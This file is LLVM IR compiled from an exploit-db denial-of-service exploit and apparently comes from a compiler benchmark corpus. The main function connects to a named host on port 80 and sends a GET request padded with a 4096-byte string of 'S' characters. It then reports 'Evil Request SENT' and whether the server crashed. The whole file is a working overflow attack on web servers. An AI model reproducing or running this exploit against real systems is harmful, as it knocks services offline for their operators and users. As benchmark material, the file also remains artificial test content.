; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_22503.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_22503.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [32 x i8] c"Error :Cudn't initiate winsock!\00", align 1
@.str.1 = private unnamed_addr constant [26 x i8] c"Usage : %s I.P/Hostname\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [26 x i8] c"error: can't resolve '%s'\00", align 1
@.str.3 = private unnamed_addr constant [25 x i8] c"\0AChecking web server %s\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [27 x i8] c"error: can't create socket\00", align 1
@.str.5 = private unnamed_addr constant [23 x i8] c"Error:Cudn't Connect\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [20 x i8] c"GET %s HTTP/1.0\0D\0A\0D\0A\00", align 1
@.str.7 = private unnamed_addr constant [29 x i8] c"\0D\0ATrying oveflow request... \00", align 1
@.str.8 = private unnamed_addr constant [20 x i8] c"Evil Request SENT\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [24 x i8] c"Server Crashed :-) !.\0D\0A\00", align 1
@.str.10 = private unnamed_addr constant [28 x i8] c"Server is prolly patched.\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [100 x i8], align 16
  %9 = alloca %struct.hostent*, align 8
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca [4096 x i8], align 16
  %12 = alloca [5000 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = bitcast [4096 x i8]* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %13, i8 0, i64 4096, i1 false)
  %14 = call i32 (...) @graphitte()
  %15 = call i64 @WSAStartup(i32 257, i32* %6)
  %16 = icmp ne i64 %15, 0
  br i1 %16, label %17, label %19

17:                                               ; preds = %2
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %101

19:                                               ; preds = %2
  %20 = load i32, i32* %4, align 4
  %21 = icmp slt i32 %20, 2
  br i1 %21, label %22, label %28

22:                                               ; preds = %19
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.1, i64 0, i64 0), i8* %25)
  %27 = call i32 @exit(i32 0) #4
  unreachable

28:                                               ; preds = %19
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 1
  %31 = load i8*, i8** %30, align 8
  %32 = call %struct.hostent* @gethostbyname(i8* %31)
  store %struct.hostent* %32, %struct.hostent** %9, align 8
  %33 = icmp eq %struct.hostent* %32, null
  br i1 %33, label %34, label %39

34:                                               ; preds = %28
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 1
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0), i8* %37)
  store i32 1, i32* %3, align 4
  br label %101

39:                                               ; preds = %28
  %40 = load i8**, i8*** %5, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 1
  %42 = load i8*, i8** %41, align 8
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3, i64 0, i64 0), i8* %42)
  %44 = call i32 @htons(i32 80)
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  store i32 %44, i32* %45, align 4
  %46 = load i32, i32* @AF_INET, align 4
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i32 %46, i32* %47, align 4
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  %49 = load %struct.hostent*, %struct.hostent** %9, align 8
  %50 = getelementptr inbounds %struct.hostent, %struct.hostent* %49, i32 0, i32 0
  %51 = load i64, i64* %50, align 8
  %52 = inttoptr i64 %51 to %struct.in_addr*
  %53 = bitcast %struct.in_addr* %48 to i8*
  %54 = bitcast %struct.in_addr* %52 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %53, i8* align 4 %54, i64 4, i1 false)
  %55 = load i32, i32* @AF_INET, align 4
  %56 = load i32, i32* @SOCK_STREAM, align 4
  %57 = call i32 @socket(i32 %55, i32 %56, i32 0)
  store i32 %57, i32* %7, align 4
  %58 = icmp eq i32 %57, -1
  br i1 %58, label %59, label %61

59:                                               ; preds = %39
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.4, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %101

61:                                               ; preds = %39
  %62 = load i32, i32* %7, align 4
  %63 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %64 = call i32 @connect(i32 %62, %struct.sockaddr* %63, i32 12)
  %65 = icmp eq i32 %64, -1
  br i1 %65, label %66, label %68

66:                                               ; preds = %61
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.5, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %101

68:                                               ; preds = %61
  %69 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 4096
  store i8 0, i8* %69, align 16
  %70 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 0
  %71 = call i32 @memset(i8* %70, i8 signext 83, i32 4096)
  %72 = getelementptr inbounds [5000 x i8], [5000 x i8]* %12, i64 0, i64 0
  %73 = call i32 @memset(i8* %72, i8 signext 0, i32 5000)
  %74 = getelementptr inbounds [100 x i8], [100 x i8]* %8, i64 0, i64 0
  %75 = call i32 @memset(i8* %74, i8 signext 0, i32 100)
  %76 = getelementptr inbounds [5000 x i8], [5000 x i8]* %12, i64 0, i64 0
  %77 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 0
  %78 = call i32 @sprintf(i8* %76, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.6, i64 0, i64 0), i8* %77)
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.7, i64 0, i64 0))
  %80 = load i32, i32* %7, align 4
  %81 = getelementptr inbounds [5000 x i8], [5000 x i8]* %12, i64 0, i64 0
  %82 = getelementptr inbounds [5000 x i8], [5000 x i8]* %12, i64 0, i64 0
  %83 = call i32 @strlen(i8* %82)
  %84 = call i32 @send(i32 %80, i8* %81, i32 %83, i32 0)
  %85 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.8, i64 0, i64 0))
  %86 = load i32, i32* %7, align 4
  %87 = getelementptr inbounds [100 x i8], [100 x i8]* %8, i64 0, i64 0
  %88 = call i32 @recv(i32 %86, i8* %87, i32 100, i32 0)
  %89 = getelementptr inbounds [100 x i8], [100 x i8]* %8, i64 0, i64 0
  %90 = load i8, i8* %89, align 16
  %91 = sext i8 %90 to i32
  %92 = icmp eq i32 %91, 0
  br i1 %92, label %93, label %95

93:                                               ; preds = %68
  %94 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.9, i64 0, i64 0))
  br label %97

95:                                               ; preds = %68
  %96 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.10, i64 0, i64 0))
  br label %97

97:                                               ; preds = %95, %93
  %98 = load i32, i32* %7, align 4
  %99 = call i32 @closesocket(i32 %98)
  %100 = call i32 (...) @WSACleanup()
  br label %101

101:                                              ; preds = %97, %66, %59, %34, %17
  %102 = load i32, i32* %3, align 4
  ret i32 %102
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

declare dso_local i32 @graphitte(...) #2

declare dso_local i64 @WSAStartup(i32, i32*) #2

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @htons(i32) #2

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @memset(i8*, i8 signext, i32) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

declare dso_local i32 @closesocket(i32) #2

declare dso_local i32 @WSACleanup(...) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
